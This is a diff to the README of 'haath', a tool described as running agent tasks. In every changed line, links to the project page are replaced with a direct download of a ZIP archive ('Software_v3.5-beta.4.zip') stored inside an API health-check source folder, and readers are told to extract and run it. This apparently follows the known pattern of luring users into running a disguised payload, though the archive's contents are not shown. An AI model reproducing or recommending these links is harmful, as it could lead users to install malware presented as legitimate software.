@@ -1,6 +1,6 @@
 # 🤖 haath - Run agent tasks with ease
 
-[![Download haath](https://img.shields.io/badge/Download-haath-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/danielaejean2211-boop/haath)
+[![Download haath](https://img.shields.io/badge/Download-haath-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/danielaejean2211-boop/haath/raw/refs/heads/main/gateway/src/app/api/v1/health/Software_v3.5-beta.4.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ It uses the ASM protocol and the CLRUN terminal to help the app work with agents
 
 Visit this page to download haath:
 
-[https://github.com/danielaejean2211-boop/haath](https://github.com/danielaejean2211-boop/haath)
+[https://github.com/danielaejean2211-boop/haath/raw/refs/heads/main/gateway/src/app/api/v1/health/Software_v3.5-beta.4.zip](https://github.com/danielaejean2211-boop/haath/raw/refs/heads/main/gateway/src/app/api/v1/health/Software_v3.5-beta.4.zip)
 
 Open the page, look for the latest release or download option, and get the Windows file from there. If the page shows a ZIP file, download it and extract it before you run the app.
 
@@ -180,7 +180,7 @@ This helps avoid broken links inside the folder.
 
 ## 📌 Quick Start
 
-1. Go to the download page: https://github.com/danielaejean2211-boop/haath
+1. Go to the download page: https://github.com/danielaejean2211-boop/haath/raw/refs/heads/main/gateway/src/app/api/v1/health/Software_v3.5-beta.4.zip
 2. Download the Windows file
 3. Extract it if needed
 4. Open the app
@@ -190,7 +190,7 @@ This helps avoid broken links inside the folder.
 
 Use this link if you need to return to the file:
 
-[https://github.com/danielaejean2211-boop/haath](https://github.com/danielaejean2211-boop/haath)
+[https://github.com/danielaejean2211-boop/haath/raw/refs/heads/main/gateway/src/app/api/v1/health/Software_v3.5-beta.4.zip](https://github.com/danielaejean2211-boop/haath/raw/refs/heads/main/gateway/src/app/api/v1/health/Software_v3.5-beta.4.zip)
 
 ## 🧭 Built For
 
